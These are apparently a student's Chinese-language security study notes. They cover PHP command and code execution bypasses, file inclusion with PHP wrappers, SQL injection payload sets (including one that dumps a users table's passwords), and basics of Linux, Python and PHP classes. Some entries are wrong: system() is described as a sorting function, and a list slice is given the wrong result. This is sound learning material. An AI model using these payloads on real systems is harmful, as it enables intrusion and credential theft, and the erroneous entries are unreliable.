# 学习报告（二）

## 代码/命令执行漏洞

### 代码执行漏洞

由于**服务器**对危险函数过滤不严导致**用户输入**的一些字符串**可以被转换成代码执行**,从而造成代码执行漏洞

代码执行函数：**${}**执行代码（中间的php代码将会被解析）

​						  **eval/assert**（将字符串当做函数进行执行/计算数学表达式）

​					      **preg_replace**（执行一个正则表达式的搜索和替换 执行代码需要使用/e修饰符）

​						  **create_function**(string $args,string $code)	

 						 args是要创建的函数的参数

​						  code是函数内的代码

​						  **array_map**（为数组的每个元素应用回调函数）

​						  **call_user_func/call_user_func_array**

​						  回调函数

​						  **array_filter**

​						  **usort**（使用自定义函数对数组进行排序）

### 命令执行漏洞

区分Windows和Linux

Web应用的**脚本代码**在执行命令的时候**过滤不严**，造成**命令注入**一段攻击者能够控制的代码,在**服务器**上以Web服务的后台权限远程执行恶意指令

命令执行函数：**system**（使用自定义函数对数组进行排序）

​						 **exec**（不输出结果,返回执行结果的最后一行）

​						 **passthru**（此函数只调用命令 并把运行结果原样地直接输出 没有返回值）

​						 **shell_exec**（不输出结果，返回执行结果 ）

​						 **ob_start**（打开输出缓冲）

​                          **``**

命令连接符

### 绕过方式

#### 管道符

windows：

‘|’ 直接执行后面的语句
‘||’ 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句
‘&’ 前面和后面命令都要执行，无论前面真假
&&如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令

Linux:
Linux系统包含了windows系统上面四个之外，还多了一个 ‘;’ 这个作用和 ‘&’ 作用相同

#### 空格过滤

<   --  cat<flag.php
<> --   cat<>flag.php
%09	 --  需要php环境，如cat%09flag.php
${IFS}   --  cat${IFS2}flag.php
$IFS$9  --  后面加个$与{}类似，起截断作用，$9是当前系统shell进程第九个参数持有者，始终为空字符串，如cat$IFS2$9flag.php

#### 黑名单绕过

##### **拼接**

```bash
a=fl;b=ag;cat $a$b
```

```bash
url=l\s / | tee 1.txt
```

**tee命令显示 程序的输出并将其复制到一个文件中**

##### **编码**

base64

hex编码

##### **单引号/双引号绕过**

```bash
ca‘‘t flag 或ca""t flag
```

##### **反斜杠绕过**

```bash
cat `ls` （该目录下存在index.php和flag.php，也就是此命令会扫描当前目录然后读取所有文件）
等效于
cat flag.php;cat index.php
echo `ls`;
echo $(ls);
?><?=`ls`;
?><?=$(ls);
<?=`ls /`;?>      
#   以上语句皆等效于<?php echo `ls /`; ?>
```

**绕过ip的句号**

##### 长度限制绕过

linux中用>（**重定向**）来导入内容到新创建的文件

通过>>符号将字符串添加到文件内容末尾，不会覆盖原内容

##### ls命令

##### Linux文件管理命令

## Linux命令

### 文件基本属性

![363003_1227493859FdXT](https://www.runoob.com/wp-content/uploads/2014/06/363003_1227493859FdXT.png)

属主：对文件具有所有权的用户

属组：用户所在组

#### 更改文件属性

##### chgrp：更改文件属组

**递归参数：-R**（常用）

##### chown：更改文件属主，也可以同时更改文件属组

```
chown [–R] 属主名 文件名
chown [-R] 属主名：属组名 文件名
```

##### chmod：更改文件9个属性

r:4

w:2

x:1

user：用户

group：组

others：其他

all：全部

+(加入)
-(除去)
=(设定)

```
chmod [-R] xyz 文件或目录
```

### 文件与目录管理

##### ls (列出目录)

**-a** ：全部的文件，连同隐藏文件( 开头为 . 的文件) 一起列出来(常用)

**-d** ：仅列出目录本身，而不是列出目录内的文件数据(常用)

**-l** ：长数据串列出，包含文件的属性与权限等等数据；(常用)

##### cd (切换目录)

```
 cd [相对路径或绝对路径]
```

##### pwd (显示目前所在的目录)

**-P** ：显示出确实的路径，而非使用链接 (link) 路径。

##### mkdir (创建新目录)

```
mkdir [-mp] 目录名称
```

-m ：配置文件的权限喔！直接配置，不需要看默认权限 (umask) 的脸色～

-p ：帮助你直接将所需要的目录(包含上一级目录)递归创建起来！

##### rmdir (删除空的目录)

```
 rmdir [-p] 目录名称
```

**-p ：**从该目录起，一次删除多级空目录

##### cp (复制文件或目录)

```
[root@www ~]# cp [-adfilprsu] 来源档(source) 目标档(destination)
[root@www ~]# cp [options] source1 source2 source3 .... directory
```

参数：

**-a：**相当於 -pdr 的意思，至於 pdr 请参考下列说明；(常用)

**-d：**若来源档为链接档的属性(link file)，则复制链接档属性而非文件本身；

**-f：**为强制(force)的意思，若目标文件已经存在且无法开启，则移除后再尝试一次；

**-i：**若目标档(destination)已经存在时，在覆盖时会先询问动作的进行(常用)

**-l：**进行硬式链接(hard link)的链接档创建，而非复制文件本身；

**-p：**连同文件的属性一起复制过去，而非使用默认属性(备份常用)；

**-r：**递归持续复制，用於目录的复制行为；(常用)

**-s：**复制成为符号链接档 (symbolic link)，亦即『捷径』文件；

**-u：**若 destination 比 source 旧才升级 destination ！

##### rm (移除文件或目录)

```
 rm [-fir] 文件或目录
```

- -f ：就是 force 的意思，忽略不存在的文件，不会出现警告信息；
- -i ：互动模式，在删除前会询问使用者是否动作
- -r ：递归删除（注意使用）

##### mv (移动文件与目录，或修改名称)

```
[root@www ~]# mv [-fiu] source destination
[root@www ~]# mv [options] source1 source2 source3 .... directory
```

- -f ：force 强制的意思，如果目标文件已经存在，不会询问而直接覆盖；
- -i ：若目标文件 (destination) 已经存在时，就会询问是否覆盖！
- -u ：若目标文件已经存在，且 source 比较新，才会升级 (update)

##### cat（由第一行开始显示文件内容）

```
cat [-AbEnTv]
```

-A ：相当於 -vET 的整合选项，可列出一些特殊字符而不是空白而已；

-b ：列出行号，仅针对非空白行做行号显示，空白行不标行号！

-E ：将结尾的断行字节 $ 显示出来；

-n ：列印出行号，连同空白行也会有行号，与 -b 的选项不同；

-T ：将 [tab] 按键以 ^I 显示出来；

-v ：列出一些看不出来的特殊字符

##### tac（从最后一行开始显示）

##### nl（显示行号）

```
nl [-bnw] 文件
```

-b ：指定行号指定的方式，主要有两种：
-b a ：表示不论是否为空行，也同样列出行号(类似 cat -n)；
-b t ：如果有空行，空的那一行不要列出行号(默认值)；

-n ：列出行号表示的方法，主要有三种：
-n ln ：行号在荧幕的最左方显示；
-n rn ：行号在自己栏位的最右方显示，且不加 0 ；
-n rz ：行号在自己栏位的最右方显示，且加 0 ；

-w ：行号栏位的占用的位数。

##### more（一页一页翻动）

空白键 (space)：代表向下翻一页；

Enter     ：代表向下翻『一行』；

/字串     ：代表在这个显示的内容当中，向下搜寻『字串』这个关键字；

:f      ：立刻显示出档名以及目前显示的行数；

q       ：代表立刻离开 more ，不再显示该文件内容。

b 或 [ctrl]-b ：代表往回翻页，不过这动作只对文件有用，对管线无用。

##### less（一页一页翻动）

空白键  ：向下翻动一页；

[pagedown]：向下翻动一页；

[pageup] ：向上翻动一页；

/字串   ：向下搜寻『字串』的功能；

?字串   ：向上搜寻『字串』的功能；

n     ：重复前一个搜寻 (与 / 或 ? 有关！)

N     ：反向的重复前一个搜寻 (与 / 或 ? 有关！)

q     ：离开 less 这个程序；

##### head（取出文件前面几行）

```
head [-n number] 文件 
```

-n ：后面接数字，代表显示几行的意思

##### tail（取出文件后面几行）

```
tail [-n number] 文件
```

-n ：后面接数字，代表显示几行的意思

-f ：表示持续侦测后面所接的档名，要等到按下[ctrl]-c才会结束tail的侦测

### 用户和用户组管理

#### useradd（添加用户账号）

```
useradd 选项 用户名
```

- -c comment 指定一段注释性描述。
- -d 目录 指定用户主目录，如果此目录不存在，则同时使用-m选项，可以创建主目录。
- -g 用户组 指定用户所属的用户组。
- -G 用户组，用户组 指定用户所属的附加组。
- -s Shell文件 指定用户的登录Shell。
- -u 用户号 指定用户的用户号，如果同时有-o选项，则可以重复使用其他用户的标识号。

#### userdel（删除用户账号）

```
userdel 选项 用户名
```

#### usermod（修改用户账号）

```
usermod 选项 用户名
```

#### passwd(用户口令的管理)

超级用户可以为自己和其他用户指定口令，**普通用户**只能用它修改自己的口令

```
passwd 选项 用户名
```

- -l 锁定口令，即禁用账号。
- -u 口令解锁。
- -d 使账号无口令。
- -f 强迫用户下次登录时修改口令。

#### groupadd(增加一个新的用户组)

```
groupadd 选项 用户组
```

- -g GID 指定新用户组的组标识号（GID）。
- -o 一般与-g选项同时使用，表示新用户组的GID可以与系统已有用户组的GID相同。

#### groupdel(删除一个已有的用户组)

```
groupdel 用户组
```

#### groupmod(修改用户组的属性)

```
groupmod 选项 用户组
```

- -g GID 为用户组指定新的组标识号。
- -o 与-g选项同时使用，用户组的新GID可以与系统已有用户组的GID相同。
- -n新用户组 将用户组的名字改为新名字

#### newgrp(切换到其他用户组)

### 与用户账号有关的系统文件

#### /etc/passwd文件（记录了用户的一些基本属性）

```
用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录Shell
```

**用户名**是代表用户账号的字符串

**口令**是加密后的用户口令字

**用户标识号**是一个整数，系统内部用来标识用户

**组标识号**字段记录用户所属的用户组

**注释性描述**字段记录着用户的一些个人情况

**主目录**是用户的起始工作目录

用户登录后，要启动一个进程，负责将用户的操作传给内核

**Shell**是用户与Linux系统之间的接口

**伪用户**

```
bin 拥有可执行的用户命令文件 
sys 拥有系统文件 
adm 拥有帐户文件 
uucp UUCP使用 
lp lp或lpd子系统使用 
nobody NFS使用
```



### linux通配符

一般只用于文件名匹配，由shell解析

*：匹配任意多个字符

?：匹配任意一个字符

[...]：匹配中括号内出现的任意一个字符

[!...] / [^ ...：不匹配中括号内出现的任意一个字符

[c1-c2] :匹配 c1-c2 中的任意单一字符

[!c1-c2]或[ ^c1-c2 ]:匹配不在c1-c2的任意字符

{string1,string2,...}:匹配 sring1 或 string2 (或更多)其一字符串

### 正则表达式

## python

### 列表

列表索引从0开始 如list = [1, 2, 3, 4, 5 ]

#### 访问值

索引 list[0]=1

使用方括号的形式截取字符 list[1:2]=[2,3]

#### 更新

list.append

#### 删除

del list[2]

#### 脚本操作符

+ +号用于组合列表

* *号用于重复列表

* len（）返回长度

* factor in list[] 判断factor是否存在与列表中

* for x in list[]:print x 迭代

  

#### 截取

L[2]：读取列表中第三个元素

L[-2]：读取列表中倒数第二个元素

L[1:]：从第二个元素开始截取列表

### 元组

tup=（）

任意无符号的对象，以逗号隔开，默认为元组

**元组与列表类似**

不同：元组的元素不能修改，但可对元组进行拼接

​		   元组中的元素值不允许删除，但可以使用del语句来删除整个元组

### 字典

dict={key1：values1，key2：values2}

通过key访问values，修改values，可删除key或整个dict

#### 键的特性

不允许同一个键出现两次。创建时如果同一个键被赋值两次，后一个值会被记住

键必须不可变，可以用数字，字符串或元组充当，但不能用列表

### 模块

**命名空间**是一个包含了变量名称们（键）和它们各自相应的对象们（值）的字典

#### import（引入）

```
import module1[, module2[,... moduleN]]
```

module：**模块名.函数名**

from ... import:从模块中导入一个**指定部分**到当前命名空间中

from ... import*:把一个模块的**所有内容**全都导入到当前的命名空间

### 函数

#### dir（）

返回容纳了一个模块里定义的所有模块，变量和函数的列表

#### globals() /locals() 

根据调用地方的不同，返回全局和局部命名空间里的名字

两个函数的返回类型都是字典。名字能用 keys() 函数摘取

#### reload（）

```
reload(module_name)
```

重新导入之前导入过的模块

#### 包（模块的分层次文件目录结构）

必须存在 init.py 文件

## 文件包含漏洞

文件包含:把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用此文件，无需再次编写。

漏洞成因：因将被包含的文件设置为变量，用来进行动态调用使用户对这个变量可控但服务端没有做合理的校验或者校验被绕过就造成了文件包含漏洞。

### 漏洞出现函数

#### phpinfo（）

显示php所有信息

#### intval()

获取变量整数值

直到遇上数字或正负符号才开始做转换，在遇到非数字或字符串结束时结束转换

#### switch（）

将数字类型的case的判断的参数转换为int类型

#### in_array（）

函数搜索数组中是否存在指定的值

#### unset($var)

用于销毁给定的变量（$var: 要销毁的变量）

#### ereg（）

指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。（大小写敏感）

#### Strcmp()

strcmp(string1,string2) 函数比较两个字符串

#### is_numeric（）

用于检测变量是否为数字或数字字符串，如果变量是否为数字，是数字返回1，不是则返回0。

#### parse_str() 

把查询字符串解析到变量中

#### extract()

从数组中将变量导入到当前的符号表

#### 文件包含函数

include( )
当使用该函数包含文件时，只有代码执行到 include()函数时才将文件包含进来，发生错误时之给出一个警告，继续向下执行。
include_once( )
功能与Include()相同，区别在于当重复调用同一文件时，程序只调用**一次**。
require( )
require()与include()的区别在于require()执行如果发生错误，函数会输出错误信息，并终止脚本的运行。
require_once( )
功能与require()相同，区别在于当重复调用同一文件时，程序只调用**一次**。

#### 文件上传

move_uploaded_file(file,newloc)

将上传的文件移动到新位置。

若成功，则返回 true，否则返回 false。

### PHP伪协议

#### `file://` 协议（默认封装协议，展现了本地文件系统）

访问本地文件系统

file://[文件的绝对路径和文件名]

​		[文件的相对路径和文件名]

[http：//网络路径和文件名]

#### php:// 协议（访问输入/输出流）

##### php://fd

##### php://memory/temp

##### php://input（执行代码）

##### php://output

##### php://filter（读取源码）

在协议路径传递

必选：resource=<要过滤的数据流>

可选：ead=<读链的过滤器>

​		   write=<写链的过滤器>

​		   <; 两个链的过滤器>

**filephp://filter/read=convert.base64-encode/resource=[文件名]**读取文件源码

php://input + [POST DATA]`执行php代码

##### 过滤器

###### 字符串

**string.rot13**，等同于`str_rot13()`，rot13变换

**string.toupper**，等同于`strtoupper()`，转大写字母

**string.tolower**，等同于`strtolower()`，转小写字母

**string.strip_tags**，等同于`strip_tags()`，去除html、PHP语言标签

###### 转换

**convert.base64-encode & convert.base64-decode**，等同于`base64_encode()`和`base64_decode()`，base64编码解码

**convert.quoted-printable-encode & convert.quoted-printable-decode**，quoted-printable 字符串与 8-bit 字符串编码解码

###### 压缩

**zlib.deflate & zlib.inflate**

**bzip2.compress & bzip2.decompress**

###### 加密

**mcrypt.***

**mdecrypt.***

##### zip:// & bzip2:// & zlib:// 协议

访问压缩文件中的子文件，可修改为任意后缀

zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]

compress.bzip2://file.bz2压缩 phpinfo.txt 为 phpinfo.bz2 并上传

compress.zlib://file.gz

##### `data://` 协议（执行PHP代码）

data://text/plain，需写入内容

data://text/plain;base64

###### `http:// & https://` 协议（远程包含）

###### `phar://` 协议

## SQL注入

### 联合注入（必须有显示位）

**判断返回列**

order by 3 --+

**查看显示位**

union select 1,2,3 --+

**爆数据**

union select 1,version(),database()

**爆库名**

union select 1,database(),group_concat(schema_name) from information_schema.schemata --+

**爆表名**

union select 1,database(),(select group_concat(table_name) from information_schema.tables where table_schema=database()) --+

**爆列名**

union select 1,database(),( select group_concat(column_name) from information_schema.columns where table_schema =database() and table_name='users' ) --+


**爆数据**

union select 1,database(),(select group_concat(concat(id,0x7e,username,0x3A,password,0x7e)) from users) *--+*	

### 报错注入（有数据库报错信息）

函数（加粗部分同上）

and extractvalue(1,concat(0x7e,**(select database()**),0x7e)) *--+*

and updatexml(1,concat(0x7e,**(select version()**),0x7e),3) --+

and(select 1 from(select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) --+			

and (select exp(~**(select * from(select version()**)x))); --+

and geometrycollection(**(select * from(select * from(select version()**)a)b)); --+

and linestring(**(select * from(select * from(select version()**)a)b)); --+

and polygon(**(select * from(select * from(select version()**)a)b)); --+

and multipoint(**(select * from(select * from(select version()**)a)b)); --+

and multipolygon(**(select * from(select * from(select version()**)a)b)); --+

and multilinestring(**(select * from(select * from(select version())**a)b)); --+

### 延迟注入

**注入点判断**

and sleep(5) --+ 											 #注入点正确时，页面卡住5秒中

**基于时间盲注**

and if(length(database())=8,sleep(5),1) *--+*	表达式为Ture时，页面卡住5秒。否则页面卡住一秒

### 布尔注入

**判断数据库长度**

and length(database())=8 --+

**判断当前数据库里有几张表**

and ((select  count(*) from information_schema.tables where table_schema=database())=4) --+

**判断每张表的长度**

and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)=1--+

**判断表" users "的列数**

and ((select count(*) from information_schema.columns where table_schema=database() and table_name='users')=3) --+

**判断某张表里对应的字段的数据的长度**

and  length((select username from users where id =1))=4 --+ 		

 and  length((select password from users where id =1))=4 *--+*

### 堆叠注入（将语句堆叠在一起进行查询）

**mysql_multi_query()** 支持多条sql语句同时执行

用**;**分隔sql语句，成堆的执行sql语句

### 二次注入

**原理**

插入恶意语句

引用恶意数据

## 反序列化

### php面向对象（对现实世界的抽象）

#### 特征

- 对象的行为：对对象施加操作，如开/关灯。
- 对象的形态：施加操作时对象如何响应，颜色，尺寸，外型。
- 对象的表示：具体区分在相同的行为与状态下有什么不同

#### 类

- 定义：class +类名
- 类名后的{}内可以定义变量和方法。
- 类的变量使用 **var** 来声明, 变量也可以初始化值。
- 函数定义类似 PHP 函数的定义，但函数只能通过该类及其实例化的对象访问。

子类

父类

##### 继承

extends

```
class Child extends Parent {
   // 代码部分
}
```

#### 方法重写

改写父类

```
function getUrl() {
   echo $this->url . PHP_EOL;
   return $this->url;
}
```

#### 访问控制

- **public（公有）：**公有的类成员可以在任何地方被访问。
- **protected（受保护）：**受保护的类成员则可以被其自身以及其子类和父类访问。
- **private（私有）：**私有的类成员则只能被其定义所在的类访问。

##### 属性的访问控制

类属性必须定义为公有，受保护，私有之一。如果用 var 定义，则被视为公有。

##### 方法的访问控制

类中的方法可以被定义为公有，私有或受保护。如果没有设置这些关键字，则该方法默认为公有。

#### 接口

interface

指定某个类**必须实现的方法**，但不需要定义这些方法（公用）的具体内容。

implements：实现接口

#### 常量

定义和使用常量的时候不需要使用 $ 符号

#### 抽象类

abstract

任何类若至少有一个方法被声明为抽象，则此类必须声明为抽象

被定义为抽象的方法只是声明了其调用方式（参数），不能定义其具体的功能实现。

#### Static

声明类属性或方法为 static(静态)，就可以不实例化类而直接访问。

#### Final

如果父类中的方法被声明为 final，则子类无法覆盖该方法。

如果一个类被声明为 final，则不能被继承。

#### 调用父类构造方法

在子类的构造方法中调用 **parent::__construct()** 以执行父类的构造方法

#### 创建对象

使用 **new** 运算符来实例化类的对象

##### 调用成员函数

setTitle（）设置标题和URL

getTitle（）获取标题和URL

#### 构造函数

为对象成员变量赋初始值

#### 析构函数

对象结束其生命周期时，系统自动执行析构函数

### 序列化及反序列化

序列化：对象转换为字节序列的过程

反序列化：字节序列恢复为对象的过程

序列化最重要的作用：在**传递和保存**对象时.保证对象的完整性和可传递性。对象转换为有序字节流,以便在**网络**上传输或者保存在本地文件中。

 反序列化最重要的作用：根据字节流中保存的对象状态及描述信息，通过反序列化重建对象

总结：核心作用就是对象状态的保存和重建。（整个过程核心点就是字节流中所保存的对象状态及描述信息）


### 序列化字符串		